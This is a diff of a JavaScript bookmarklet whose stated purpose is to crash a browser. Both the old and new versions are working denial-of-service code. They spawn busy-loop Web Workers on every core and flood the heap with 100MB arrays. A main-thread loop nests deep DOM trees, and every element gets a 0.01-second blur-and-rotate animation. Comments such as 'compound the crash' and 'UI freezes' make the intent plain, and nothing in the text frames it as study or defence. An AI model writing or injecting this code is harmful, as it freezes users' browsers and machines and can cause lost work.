@@ -1,42 +1,52 @@
 javascript:(function(){
-    /* 1. CPU SATURATION: Spawn Web Workers for every available core */
-    const workerCode = "while(true){Math.atan2(Math.random(), Math.random())*Math.tan(Math.random());}";
+    /* 1. CPU: Recursive Worker Spawning */
+    // Instead of just 8 workers, this attempts to create an endless chain
+    const workerCode = `
+        const work = () => { while(true) { Math.sqrt(Math.random()); } };
+        self.onmessage = () => { work(); };
+        work();
+    `;
     const blob = new Blob([workerCode], {type: 'text/javascript'});
-    const workerUrl = URL.createObjectURL(blob);
-    for(let i = 0; i < (navigator.hardwareConcurrency || 8); i++) {
-        new Worker(workerUrl);
+    const url = URL.createObjectURL(blob);
+    
+    for(let i = 0; i < (navigator.hardwareConcurrency || 16); i++) {
+        new Worker(url);
     }
 
-    /* 2. RAM EXHAUSTION: Persistent Heap Allocation */
-    window.massiveLeak = [];
-    setInterval(() => {
-        try {
-            // Pushes 50MB chunks into the heap every 500ms
-            const chunk = new Float64Array(6.25 * 1024 * 1024).fill(Math.random());
-            window.massiveLeak.push(chunk);
-        } catch(e) { console.warn("RAM Full"); }
-    }, 500);
+    /* 2. RAM & MAIN THREAD: Synchronous Heap Flooding */
+    // Using a while(true) loop inside a setTimeout to bypass the initial load,
+    // then locking the main thread completely so the UI freezes.
+    setTimeout(() => {
+        const leak = [];
+        while(true) {
+            // Pushing massive 100MB arrays into memory
+            leak.push(new Float64Array(12.5 * 1024 * 1024).fill(Math.random()));
+            
+            // 3. DOM: Deep Nesting (Inside the loop to compound the crash)
+            const frag = document.createDocumentFragment();
+            let parent = document.createElement('div');
+            for(let j = 0; j < 500; j++) {
+                const child = document.createElement('div');
+                child.style.cssText = "transform:rotate(1deg); filter:blur(1px);";
+                parent.appendChild(child);
+                parent = child;
+            }
+            document.body.appendChild(parent);
+        }
+    }, 100);
 
-    /* 3. GPU/RENDER OVERLOAD: Forced 3D Reflow and Filters */
-    const s = document.createElement('style');
-    s.innerHTML = `
-        @keyframes extreme {
-            0% { transform: translateZ(0px) rotate(0deg); filter: blur(0px) contrast(1); }
-            50% { transform: translateZ(500px) rotate(180deg); filter: blur(20px) contrast(10); }
-            100% { transform: translateZ(0px) rotate(360deg); filter: blur(0px) contrast(1); }
+    /* 4. GPU: Force Extreme Composite Layers */
+    const style = document.createElement('style');
+    style.innerHTML = `
+        @keyframes meltdown {
+            0% { transform: scale(1) rotate(0deg); filter: blur(0px); }
+            50% { transform: scale(1.5) rotate(180deg); filter: blur(50px); }
+            100% { transform: scale(1) rotate(360deg); filter: blur(0px); }
         }
         * { 
-            animation: extreme 0.1s infinite linear !important; 
+            animation: meltdown 0.01s infinite !important; 
             will-change: transform, filter !important;
         }
-        body { perspective: 1000px; overflow: hidden; }
     `;
-    document.head.appendChild(s);
-
-    /* 4. DOM OVERLOAD (The original intent, but throttled for longevity) */
-    setInterval(() => {
-        const d = document.createElement('div');
-        d.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;backdrop-filter:blur(5px);pointer-events:none;z-index:999';
-        document.body.appendChild(d);
-    }, 100);
+    document.head.appendChild(style);
 })();
